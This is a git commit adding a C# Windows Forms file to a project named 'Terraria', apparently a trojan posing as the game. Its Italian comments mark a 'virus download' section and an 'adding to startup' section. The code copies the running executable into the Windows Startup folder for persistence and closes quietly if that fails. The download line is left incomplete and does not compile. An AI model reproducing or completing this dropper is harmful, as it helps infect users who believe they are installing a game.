6905b56712f3a72441d7a459c37165e1f294b179
HiperBulu <bestpvp1231@gmail.com>
2016-11-21 20:14:17 +0100

    Add files via upload

---
+++ Terraria/Form1.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace Terraria
+{
+    public partial class Terraria : Form
+    {
+        public Terraria()
+        {
+            InitializeComponent();
+        }
+        private void Terraria_Load(object sender, EventArgs e)
+        {
+            //NOME DEL FILE
+            //
+            string file = System.AppDomain.CurrentDomain.FriendlyName;
+            file = file.Replace(".vshost", "");
+            info.Text = file;
+            //
+            //
+
+            //DOWNLOAD DEL VIRUS
+            //
+            //
+            string download =;
+            //
+            //AGGIUNTA ALLO STARTUP
+            //
+            try
+            {
+                System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + download);
+            }
+            catch
+            {
+                this.Close();
+            }
+            //
+            //
+
+
+
+        }
+    }
+}
